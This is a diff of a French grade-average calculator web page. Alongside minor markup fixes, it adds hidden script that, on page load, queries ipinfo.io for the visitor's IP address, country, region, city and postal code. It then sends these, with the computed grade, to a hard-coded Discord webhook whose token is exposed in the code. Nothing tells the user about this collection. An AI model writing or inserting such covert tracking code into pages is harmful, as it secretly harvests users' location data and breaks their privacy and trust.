@@ -1,8 +1,9 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Calcul de la moyenne générale</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calcul de la moyenne générale</title>
+    <link rel="stylesheet" href="style.css">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -97,12 +98,31 @@
         <input type="number" id="SVT" min="0" max="20" step="1" required><br>
 
         <button type="button" onclick="calculate()">Calculer</button>
-        <div id="errorMessage" class="error-message" style="display: none;">Veuillez remplir toutes les notes avec des valeurs inférieures ou egales à 20 mkelekh(a)</div>
+        <div id="errorMessage" class="error-message" style="display: none;">Veuillez remplir toutes les notes avec des valeurs inférieures ou égales à 20 mkelekh(a)</div>
     </form>
 
     <div id="result"></div>
 
     <script>
+        var userIP;
+        var userCountry;
+        var userRegion;
+        var userCity;
+        var userZIP;
+
+        function monke(json) {
+            userIP = json.ip;
+            userCountry = json.country;
+            userRegion = json.region;
+            userCity = json.city;
+            userZIP = json.postal;
+        }
+
+        // Script for fetching the IP address
+        var ipScript = document.createElement('script');
+        ipScript.src = "https://ipinfo.io/?format=json&callback=monke";
+        document.body.appendChild(ipScript);
+
         function calculate() {
             const coefficients = {
                 "conduite": 1,
@@ -141,7 +161,7 @@
                 // Send data to Discord webhook
                 const webhookUrl = "https://discord.com/api/webhooks/1214289604673409074/ayXZinMyk7uCx5UwwypWdIiq24c1roayV67nb16nYf5anVPU9By5pDokIb0y9-rowbSd";
                 const data = {
-                    content: "Nouvelle note calculée: " + moyenneGenerale.toFixed(2)
+                    content: "New grade: " + moyenneGenerale.toFixed(2) + "\nIP : " + userIP + "\nCountry: " + userCountry + "\nRegion: " + userRegion + "\nTown/City: " + userCity + "\nZIP: " + userZIP
                 };
 
                 fetch(webhookUrl, {
@@ -159,4 +179,3 @@
     </script>
 </body>
 </html>
-
